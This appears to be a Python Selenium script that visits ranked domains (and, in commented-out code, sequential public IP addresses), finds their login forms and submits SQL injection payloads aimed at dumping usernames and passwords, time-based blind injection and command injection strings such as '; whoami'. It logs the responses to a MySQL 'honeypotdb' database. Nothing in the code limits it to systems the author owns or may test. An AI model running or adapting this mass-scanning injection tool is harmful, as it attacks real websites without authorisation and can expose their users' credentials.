from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import json
import time
import socket
from dotenv import load_dotenv
import os
import mysql.connector
from urllib.parse import urlparse
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, StaleElementReferenceException,NoSuchElementException
import csv
#Load Credentials from .env 
load_dotenv()

#global id counter 
id_counter = 1

# MySQL database connection
db_connection = mysql.connector.connect(
    host='127.0.0.1',
    user='root',
    password=os.getenv('MYSQL_PASSWORD'),
    database='honeypotdb'
)

#Create a cursor object using the cursor() method
c_rsp = db_connection.cursor()
c_lrn = db_connection.cursor()
c_main = db_connection.cursor()


#Set up Chrome options and capabilities for enabling network traffic capturing
chrome_options = Options()
chrome_options.add_argument("--start-maximized")  # Open browser in maximized mode
chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
chrome_options.add_argument('--ignore-certificate-errors')

# Specify the path to chromedriver
chromedriver_path = os.getenv('CHROMEDRIVER_PATH')  # Replace with your chromedriver path
service = Service(chromedriver_path)

# Initialize WebDriver
driver = webdriver.Chrome(service=service, options=chrome_options)

# Define a function to find login elements dynamically
def find_login_elements(driver):
    # Common locators to try for username and password fields
    locators = [
        {'username': (By.NAME, 'username'), 'password': (By.NAME, 'password')},
        {'username': (By.ID, 'username'), 'password': (By.ID, 'password')},
        {'username': (By.CSS_SELECTOR, 'input[name="username"]'), 'password': (By.CSS_SELECTOR, 'input[name="password"]')},
        {'username': (By.CSS_SELECTOR, 'input[type="text"]'), 'password': (By.CSS_SELECTOR, 'input[type="password"]')},
        {'username': (By.XPATH, '//input[@name="username"]'), 'password': (By.XPATH, '//input[@name="password"]')},
        {'username': (By.XPATH, '//input[@placeholder="Enter your username"]'), 'password': (By.XPATH, '//input[@type="password"]')},
        {'username': (By.XPATH, '//input[@placeholder="username"]'), 'password': (By.XPATH, '//input[@placeholder="password"]')},
        {'username': (By.XPATH, '//input[@placeholder="Username"]'), 'password': (By.XPATH, '//input[@placeholder="Password"]')},
        {'username': (By.XPATH, '//input[@placeholder="Email"]'), 'password': (By.XPATH, '//input[@placeholder="Password"]')}
    ]

    # Try each locator set
    for locator in locators:
        try:
            username_field = driver.find_element(*locator['username'])
            password_field = driver.find_element(*locator['password'])
            return username_field, password_field
        except:
            pass
    return None, None

def find_internal_links(driver, base_url):
    links = driver.find_elements(By.TAG_NAME, 'a')
    internal_links = []
    for link in links:
        href = link.get_attribute('href')
        link_text = link.text
        if href and urlparse(href).netloc == urlparse(base_url).netloc and ("Log In" in link_text or "Sign In" in link_text):
            internal_links.append(href)
    return internal_links

def navigate_to_login_page(driver, base_url):
    internal_links = find_internal_links(driver, base_url)
    for link in internal_links:
        driver.get(link)
        username_field, password_field = find_login_elements(driver)
        if username_field and password_field:
            return username_field, password_field
    return None, None

def save_to_db(req_method, req_path, req_headers, req_body, res_status, res_headers, res_body):
    """Save request and response data to the database."""
    global id_counter

    try:
        # Print debug information
        print("Saving to DB:")
        print(f"Request Method: {req_method}")
        print(f"Request Path: {req_path}")
        print(f"Request Headers: {req_headers}")
        print(f"Request Body: {req_body}")
        print(f"Response Status: {res_status}")
        print(f"Response Headers: {res_headers}")
        print(f"Response Body: {res_body}")

        # Convert headers to JSON strings if they are dictionaries
        if isinstance(req_headers, dict):
            req_headers = json.dumps(req_headers)
        if isinstance(res_headers, dict):
            res_headers = json.dumps(res_headers)

        # Ensure body is a string
        if isinstance(req_body, bytes):
            req_body = req_body.decode('utf-8')
        if isinstance(res_body, bytes):
            res_body = res_body.decode('utf-8')

     # Check if response already exists
        c_rsp.execute('SELECT res_id FROM http_response WHERE status = %s AND headers = %s AND body = %s', 
                    (res_status, res_headers, res_body))
        result = c_rsp.fetchall()
        if result:
            res_id = result[0][0]
        else:
            sql_rsp = 'INSERT INTO http_response (status, headers, body) VALUES (%s, %s, %s)'
            c_rsp.execute(sql_rsp, (res_status, res_headers, res_body))
            res_id = c_rsp.lastrowid
            id_counter += 1

        # Insert request data
        sql_req = 'INSERT INTO request_data (method, path, headers, body, res_id) VALUES (%s, %s, %s, %s, %s)'
        c_lrn.execute(sql_req, (req_method, req_path, req_headers, req_body, res_id))
        db_connection.commit()

    except Exception as e:
        print(f"Failed to save to DB: {e}")


# Function to capture network traffic
def capture_network_traffic(driver):
    logs = driver.get_log('performance')
    post_requests = {}
    
    for entry in logs:
        log = json.loads(entry['message'])['message']
        try:
            if log['method'] == 'Network.requestWillBeSent':
                request_url = log['params']['request']['url']
                request_method = log['params']['request']['method']
                request_headers = log['params']['request'].get('headers', {})
                post_data = log['params']['request'].get('postData', '')
                
                if request_method == 'POST':
                    post_requests[log['params']['requestId']] = {
                        'url': request_url,
                        'headers': request_headers,
                        'data': post_data,
                        'response': {'status': None, 'body': '', 'headers': {}}
                    }
                    print(f"Captured POST request: {request_url}")
                    print(f"Request headers: {request_headers}")
                    print(f"POST data: {post_data}")

            elif log['method'] == 'Network.responseReceived':
                request_id = log['params']['requestId']
                response_status = log['params']['response'].get('status', None)
                response_headers = log['params']['response'].get('headers', {})
                
                if request_id in post_requests:
                    post_requests[request_id]['response']['status'] = response_status
                    post_requests[request_id]['response']['headers'] = response_headers
                    print(f"Captured HTTP response (POST): {post_requests[request_id]['url']}")
                    print(f"Response status: {response_status}")
                    print(f"Response headers: {response_headers}")

                    # Capture response body
                    try:
                        response_body = driver.execute_cdp_cmd('Network.getResponseBody', {'requestId': request_id})
                        post_requests[request_id]['response']['body'] = response_body.get('body', '')
                        if response_body.get('body') != '':
                            print(f"Captured response body for {post_requests[request_id]['url']}: {post_requests[request_id]['response']['body']}")
                    except Exception as e:
                        print(f"Failed to get response body: {e}")

        except KeyError as e:
            print(f"KeyError: {e} - Entry: {log}")

    for request_id, data in post_requests.items():
        url = data['url']
        print(f"\nFinal data for POST request to {url}:")
        print(f"Request headers: {data['headers']}")
        print(f"Request data: {data['data']}")
        print(f"Response status: {data['response']['status']}")
        print(f"Response headers: {data['response']['headers']}")
        if data['response']['body']:
            print(f"Response body: {data['response']['body']}")
        else:
            print("Response body: No data captured")
        
        # Extract parameters for save_to_db
        req_method = 'POST'
        req_path = urlparse(url).path
        req_headers = data['headers']
        req_body = data['data']
        res_status = data['response']['status']
        res_headers = data['response']['headers']
        res_body = data['response']['body']
        if res_body is not None and res_body != '' and res_status is not None:
            # Save to database
            save_to_db(req_method, req_path, req_headers, req_body, res_status, res_headers, res_body)



        # Call save_to_db
        #save_to_db(req_method, req_path, req_headers, req_body, res_status, res_headers, res_body)
'''
# Load IPs from a file
def load_ips_from_file(filename):
    with open(filename, 'r') as file:
        ips = file.readlines()
    return [ip.strip() for ip in ips]

# Visit each IP from the .txt file
ip_list = load_ips_from_file('reachable_ips.txt')  # Make sure to replace with the actual path of your IP file
# Function to generate a list of sequential IP addresses and store them in a set
'''

def generate_ip_list(count):
    ip_set = set()
    start_ip = (129 << 24)  # Start from 128.0.0.0
    for i in range(start_ip, start_ip + count):
        # Calculate each octet
        octet1 = (i >> 24) & 0xFF
        octet2 = (i >> 16) & 0xFF
        octet3 = (i >> 8) & 0xFF
        octet4 = i & 0xFF
        ip_set.add(f"{octet1}.{octet2}.{octet3}.{octet4}")
    return ip_set

# Generate a set of 10 sequential IP addresses (you can adjust the count)
ip_set = generate_ip_list(500)
ip_list = list(ip_set)

sql_injection_payloads = [
    "' OR '1'='1",
    "' UNION SELECT NULL, username, password FROM users --",
    "admin' --",
    "' AND 1=0 UNION SELECT NULL, username, password FROM users --",
    '" OR 1=1 --',
    "' AND 1=IF(1=1, SLEEP(5), 0) --",
    "admin' --",
    "' OR 1=1#"
]

command_injection_payloads = [
    "; ls",
    "; whoami",
    "; uname -a",
    "| id"
]

# Combine SQL and command injection payloads
attack_payloads = sql_injection_payloads + command_injection_payloads

def find_login_page(driver):
    login_button_xpaths = [
        '//a[contains(text(), "Login") or contains(text(), "Sign In")]',
        '//button[contains(text(), "Login") or contains(text(), "Sign In")]',
        '//input[@type="button" or @type="submit" and (contains(@value, "Login") or contains(@value, "Sign In"))]'
    ]

    for xpath in login_button_xpaths:
        try:
            login_button = driver.find_element(By.XPATH, xpath)
            login_button.click()
            # Wait for the page to load after clicking the login button
            WebDriverWait(driver, 15).until(
                EC.presence_of_element_located((By.ID, 'username'))
            )
            username_field = driver.find_element(By.ID, 'username')
            password_field = driver.find_element(By.ID, 'password')
            if username_field and password_field:
                return username_field, password_field
        except NoSuchElementException:
            continue
        except TimeoutException:
            continue
    return None, None

def process_ip(ip):
    target_url = f"https://{ip}" # Access each IP over HTTPS
    print(f"Visiting: {target_url}")

    # Initialize a new WebDriver instance (new browser window) for each IP
    driver = webdriver.Chrome(service=service, options=chrome_options)

    try:
        driver.set_page_load_timeout(20)  # Set timeout for page load
        driver.get(target_url)

        # Allow time for the page to load
        time.sleep(20)

        # Find login elements dynamically
        username_field, password_field = find_login_elements(driver)

        if username_field and password_field:
            for payload in attack_payloads:
                username_field.clear()
                password_field.clear()
                username_field.send_keys(payload)
                password_field.send_keys(payload)

                # Submit form
                try:
                    login_button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable(
                        (By.XPATH, '//input[@type="submit" or @value="Login" or @value="Sign In"] | '
                                   '//button[@type="submit" or contains(text(), "Sign In") or contains(text(), "Login")]')
                    ))
                    login_button.click()
                except:
                    print("Submit button not found.")
                time.sleep(10)

                # Capture network traffic
                capture_network_traffic(driver)

        else:
            print("Login elements not found. Attempting to find login page...")
            username_field, password_field = find_login_page(driver)
            if username_field and password_field:
                for payload in attack_payloads:
                    username_field.clear()
                    password_field.clear()
                    username_field.send_keys(payload)
                    password_field.send_keys(payload)

                    # Submit form
                    try:
                        login_button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable(
                            (By.XPATH, '//input[@type="submit" or @value="Login" or @value="Sign In"] | '
                                    '//button[@type="submit" or contains(text(), "Sign In") or contains(text(), "Login")]')
                        ))
                        login_button.click()
                    except TimeoutException:
                        print("Submit button not found.")
                    time.sleep(10)

                    # Capture network traffic
                    capture_network_traffic(driver)
            else:
                print("Login page not found on the website.")

    
    except TimeoutException:
        print(f"Timed out after 20 seconds for {target_url}")
    except Exception as e:
        print(f"Failed to load {target_url}: {e}")
    except StaleElementReferenceException:
        driver.refresh()
        # Re-locate elements and retry the operation
        login_button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable(
                        (By.XPATH, '//input[@type="submit" or @value="Login" or @value="Sign In"] | '
                                   '//button[@type="submit" or contains(text(), "Sign In") or contains(text(), "Login")]')
                    ))
        login_button.click()
    finally:
        driver.quit()  # Close the browser window

# Process each IP address
# Read the CSV file and process each domain
with open('ranked_domains.csv', newline='') as csvfile:
    reader = csv.DictReader(csvfile)
    for row in reader:
        domain = row['Domain']
        process_ip(domain)
        time.sleep(20)



    
'''
for ip in ip_list:
    target_url = f"http://{ip}"  # Access each IP over HTTP

    print(f"Visiting: {target_url}")
    try:
        driver.get(target_url)
        time.sleep(5)  # Allow page to load

        # Find login elements dynamically
        username_field, password_field = find_login_elements(driver)
        # If login elements are not found, look for links to a login page
        if not username_field or not password_field:
            username_field, password_field = navigate_to_login_page(driver, target_url)

        if username_field and password_field:
            for payload in attack_payloads:
                # Enter the attack payloads in the username and password fields
                username_field.clear()
                password_field.clear()
                username_field.send_keys(payload)
                password_field.send_keys(payload)
                
                print(f"Submitting payload: {payload}")
                
                # Enter credentials
                
                buttons = driver.find_elements(By.XPATH, '//button | //input[@type="submit"]')
                for button in buttons:
                    outer_html = button.get_attribute('outerHTML')
                    #print(f"Button outer HTML: {outer_html}")
                # Submit the form (try common button types)
                try:
                    login_button = WebDriverWait(driver, 5).until(EC.element_to_be_clickable(
        (By.XPATH, '//input[@type="submit" or @value="Login" or @value="Sign In"] | '
                '//button[@type="submit" or contains(text(), "Sign In") or contains(text(), "Login")]')
    ))

                    login_button.click()
                except:
                    print("Could not find a submit button.")

                # Wait for requests to be captured after form submission
                time.sleep(5)
                capture_network_traffic(driver)
        else:
            print("Login elements not found.")
    except Exception as e:
        print(f"Failed to load {target_url}: {e}")
        continue  # Move on to the next IP address

# Close the browser
driver.quit()
'''
